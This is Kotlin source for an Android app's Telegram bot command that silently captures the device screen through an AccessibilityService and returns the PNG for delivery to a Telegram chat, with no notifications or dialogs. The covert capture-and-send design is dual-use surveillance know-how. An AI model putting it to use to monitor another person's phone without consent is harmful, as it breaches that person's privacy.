package com.izhaanintellect.pasa.commands

import android.content.Context
import android.util.Log
import com.izhaanintellect.pasa.camera.ScreenshotManager
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import javax.inject.Singleton

/**
 * `/screenshot` — Capture current screen silently via AccessibilityService.
 *
 * No popups, no notifications, no dialogs. Delivers PNG to Telegram immediately.
 *
 * Usage:
 *   /screenshot
 *
 * Requirements:
 *   - User must enable "PASA Screenshot Service" in Settings > Accessibility (one-time)
 *
 * Output:
 *   - PNG file (200–600 KB typical)
 *   - Sent directly to Telegram
 */
@Singleton
class ScreenshotCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val screenshotManager: ScreenshotManager
) : Command {

    override val name = "/screenshot"
    override val description = "Capture current screen silently"
    override val usage = "/screenshot"

    companion object {
        private const val TAG = "PASA_ScreenshotCmd"
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        Log.i(TAG, "Requesting screenshot capture")

        return try {
            val screenshotFile = screenshotManager.captureScreenshot()

            if (screenshotFile != null && screenshotFile.exists() && screenshotFile.length() > 0) {
                val sizeMB = String.format("%.1f", screenshotFile.length() / 1024.0 / 1024.0)
                Log.i(TAG, "Screenshot captured successfully: $sizeMB MB")

                CommandResult(
                    success = true,
                    message = "📱 Screenshot captured ($sizeMB MB)",
                    photoFile = screenshotFile
                )
            } else {
                Log.w(TAG, "Screenshot file is null, empty, or doesn't exist")

                CommandResult(
                    success = false,
                    message = "❌ Screenshot capture failed. Ensure 'PASA Screenshot Service' is enabled:\n\n" +
                            "1. Open <b>Settings</b>\n" +
                            "2. Go to <b>Accessibility</b>\n" +
                            "3. Search for <b>PASA</b>\n" +
                            "4. Toggle <b>PASA Screenshot Service</b> ON\n" +
                            "5. Confirm the permission dialog\n\n" +
                            "Then retry this command."
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot execution error", e)

            CommandResult(
                success = false,
                message = "❌ Screenshot failed: ${e.localizedMessage ?: "Unknown error"}\n\n" +
                        "<i>Error type: ${e.javaClass.simpleName}</i>"
            )
        }
    }
}
